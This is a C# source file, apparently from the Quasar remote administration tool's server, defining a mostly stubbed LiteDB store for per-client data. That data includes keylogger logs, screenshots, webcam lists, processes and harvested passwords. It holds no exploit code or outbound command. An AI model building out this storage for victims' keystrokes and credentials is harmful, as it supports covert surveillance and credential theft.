using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;
using xServer.Core.Packets;
using xServer.Core.Packets.ClientPackets;
using LiteDB;

namespace xServer.Core.Storage
{
    public class LogStore
    {
        public int ts { get; set; }
        public string msg { get; set; }
    }
    public class ClientStore
    {
        public string id { get; set; }
        public string[] sysinfo { get; set; }

        public string[] desktops { get; set; } // Paths where screenshots have been stored.
        public int monitors { get; set; }
        public string[] webcams { get; set; }
        public string[] startupItems { get; set; }
        public string[] keyloggerLogs { get; set; } // Paths where logs for this client have been saved.
        public GetDrivesResponse drives { get; set; }
        public GetProcessesResponse processes { get; set; }
        public GetPasswordsResponse passwords { get; set; }
    }
    /// <summary>
    /// Stores last received data for clients, handles saving/loading this data, and retrieving it. Abstracted for the purpose of later using a DB.
    /// </summary>
    public static class Storage
    {
        static string dbname = "quasar.db";
        static LiteDatabase db;

        public static void getClientKeyloggerLogs(Client cli) { }
        public static void getClientDrives(Client cli) { }
        public static void getClientProcesses(Client cli) { }
        public static void getClientSystemInfo(Client cli) { }
        public static void getClientDesktops(Client cli) { }
        public static void getClientMonitors(Client cli) { }
        public static void getClientWebcams(Client cli) { }
        public static void getClientStartupItems(Client cli) { }
        public static void getClientPasswords(Client cli) { }
        //public static void getClientDirectory(Client cli){}
        //public static void getClientRegistryKey(Client cli) { }
        //public static void getClientRegistryKeyValue(Client cli) { }

        public static void setClientKeyloggerLogs(Client cli) { }
        public static void setClientDrives(Client cli) { }
        public static void setClientProcesses(Client cli) { }
        public static void setClientSystemInfo(Client cli) { }
        public static void setClientDesktops(Client cli) { }
        public static void setClientMonitors(Client cli) { }
        public static void setClientWebcams(Client cli) { }
        public static void setClientStartupItems(Client cli) { }
        public static void setClientPasswords(Client cli) { }
        //public static void setClientDirectory(Client cli){}
        //public static void setClientRegistryKey(Client cli) { }
        //public static void setClientRegistryKeyValue(Client cli) { }
            
        public static int getTimeStamp()
        {
            return (int)(new DateTimeOffset(DateTime.Now.ToUniversalTime()).ToUnixTimeSeconds());
        }
        public static void addLog(string message)
        {
            db.GetCollection<LogStore>("LogStore").Insert(new LogStore { ts = getTimeStamp(), msg = message });
        }
        public static LogStore[] getLogs()
        {
            LogStore[] entries = db.GetCollection<LogStore>("LogStore").Find(Query.All(Query.Ascending)).ToArray<LogStore>();

            return entries;
        }

        // Convert a client GUID into a database key for the client.
        public static void hashClient(Client cli)
        {
        }

        public static void init()
        {
            // init litedb...
            db = new LiteDatabase(dbname);
            addLog("DB initialized");
        }
    }
}
